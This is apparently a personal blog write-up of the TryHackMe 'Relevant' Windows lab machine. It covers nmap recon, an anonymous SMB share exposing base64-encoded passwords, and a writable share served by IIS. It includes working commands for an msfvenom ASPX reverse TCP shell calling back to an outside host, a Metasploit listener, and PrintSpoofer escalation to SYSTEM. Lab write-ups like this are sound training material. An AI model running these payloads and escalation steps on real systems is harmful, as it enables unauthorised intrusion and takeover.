---
title: THM - Relevant
author: z3nn
date: 2020-09-24 09:34:00 +0200
categories: [Hacking, TryHackMe]
description: TryHackMe Relevant Windows Box
tags: [tryhackme, relevant, windows, offensive pentest, security, security missconfiguration, pentest]
---

# TryHackMe - Relevant
A write-up to the Relevant machine provided by [TryHackMe](https://tryhackme.com/) and created by [TheMayor](https://twitter.com/joehelle). This machine is part of the `Offensive Pentesting` learning path from THM in the `Advanced Exploitation` Section being rated as a `Medium` difficulty.... Let's get to it.

The description of this machine is quite nice, having a roleplay in it to put you into the mindset of a pentester that needs to gather information about it's target (`recon`).

> You might notice the machine IP changing a few times in this write-up... that's because I wrote this the day after I completed the challenge and I had to stop / start the machine as needed to get back some information.

# Recon
Starting off with a recon on the machine to see what ports are open, what services are active, etc.

```shell
# Nmap 7.80 scan initiated Wed Sep 23 20:07:03 2020 as: nmap -sS -sV -oA relevant-vuln --script=default,vuln -p- -T5 10.10.155.253
Nmap scan report for 10.10.155.253
Host is up (0.079s latency).
Not shown: 65527 filtered ports
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-title: IIS Windows Server
| vulners:
|   cpe:/a:microsoft:iis:10.0:
|       CVE-2008-4301   10.0    https://vulners.com/cve/CVE-2008-4301
|       CVE-2008-4300   5.0     https://vulners.com/cve/CVE-2008-4300
|       CVE-2015-2808   4.3     https://vulners.com/cve/CVE-2015-2808
|_      CVE-2013-2566   4.3     https://vulners.com/cve/CVE-2013-2566
135/tcp   open  msrpc         Microsoft Windows RPC
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
445/tcp   open  microsoft-ds  Windows Server 2016 Standard Evaluation 14393 microsoft-ds
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
| rdp-ntlm-info:
|   Target_Name: RELEVANT
|   NetBIOS_Domain_Name: RELEVANT
|   NetBIOS_Computer_Name: RELEVANT
|   DNS_Domain_Name: Relevant
|   DNS_Computer_Name: Relevant
|   Product_Version: 10.0.14393
|_  System_Time: 2020-09-23T17:11:20+00:00
| ssl-cert: Subject: commonName=Relevant
| Not valid before: 2020-07-24T23:16:08
|_Not valid after:  2021-01-23T23:16:08
|_ssl-date: 2020-09-23T17:16:13+00:00; +1s from scanner time.
|_sslv2-drown:
49663/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-title: IIS Windows Server
49667/tcp open  msrpc         Microsoft Windows RPC
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
49669/tcp open  msrpc         Microsoft Windows RPC
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h24m01s, deviation: 3h07m51s, median: 0s
| smb-os-discovery:
|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
|   Computer name: Relevant
|   NetBIOS computer name: RELEVANT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2020-09-23T10:11:18-07:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2020-09-23T17:11:24
|_  start_date: 2020-09-23T17:04:52

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Sep 23 20:16:20 2020 -- 1 IP address (1 host up) scanned in 557.03 seconds
```

Right off the bat we have port 80 open with `Microsoft IIS httpd 10.0` running on it... I won't go through the entire process and mistakes I went through when working on this box so... On port 80 we have a basic IIS webserver with a standard page, nothing much to do there.

Moving on we see a few other ports open...

## 445
In the above scan we see SMB is up and running with open ports on this machine. Running a basic `smbclient` list reveals the following:
```shell
$ smbclient -L \\\\10.10.236.33\\
Enter WORKGROUP\z3nn's password:
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        nt4wrksv        Disk
SMB1 disabled -- no workgroup available
```

The `nt4wrksv` folder looks interesting, if we connect to it we can see it contains the following file:
```shell
$ smbclient \\\\10.10.236.33\\nt4wrksv
Enter WORKGROUP\z3nn's password:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Jul 26 00:46:04 2020
  ..                                  D        0  Sun Jul 26 00:46:04 2020
  passwords.txt                       A       98  Sat Jul 25 18:15:33 2020

                7735807 blocks of size 4096. 4951414 blocks available
```

Retrieving the `passwords.txt` file we get access to some base64 encoded information:
```shell
[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
```
If we run it through a base64 decoder we get the following:
```shell
[User Passwords - Encoded]
Bob - !P@$$W0rD!123
Bill - Juw4nnaM4n420696969!$$$
```

Looks like we have a `Bob` and a `Bill` ... fast-forward a while and I haven't found a use for either of those passwords ... (The interesting part is yet to come...)

## 49663
On first impression this looks like a copy of port 80, just a bare IIS server running on it, nothing special... but the version of HTTPAPI is different.... what else could be different ?

Running `gobuster` on it reveals there is a directory /nt4wrksv/ ... just like the on on SMB, if we actually try to access the file from SMB via the browser we can using the right path: `/nt4wrksv/passwords.txt`... Now this is interesting.

Running `smbmap` on the server we can see we have write access to the `/nt4wrksv/` location
```shell
$ smbmap -H 10.10.125.76 -u 'z3nn' -p ''
[+] Guest session       IP: 10.10.125.76:445    Name: unknown
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        nt4wrksv                                                READ, WRITE
```

# Exploit
Now that we have knowledge of the vulnerability and our entry point in the system it's time to exploit it... I used [PenTest.WS](https://pentest.ws/) to create a `MSF Venom` payload
```shell
msfvenom -p windows/x64/shell/reverse_tcp LHOST=1.1.1.1 LPORT=8585 -f aspx -o reverso.aspx
```

Upload payload to SMB server in `/nt4wrksv/` location

Start a netcat listener or... use the PenTest.WS `msfconsole` command it creates for you to open as a listener to this payload:
```shell
msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/x64/shell/reverse_tcp; set LHOST 1.1.1.1; set LPORT 8585; run"
```

Access the payload via the web interface at /nt4wrksv/reverso.axp

We're in! Get the user flag.

# PrivEsc
PrivEsc was a bit funky, I did not expect it to be so easy... this machine was a slap in the face if you try too hard.

Thanks to `TheMayor`'s github repo we can download an already built `PrintSpoofer.exe` from here: [repo](https://github.com/dievus/printspoofer)

Upload that to the SMB server as we did with the reverse shell and run it...
```shell
c:\Users\Bob\Desktop>whoami
whoami
iis apppool\defaultapppool
..........
c:\inetpub\wwwroot\nt4wrksv>spoof.exe -i -c cmd
spoof.exe -i -c cmd
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

That's it... get root flag and get out.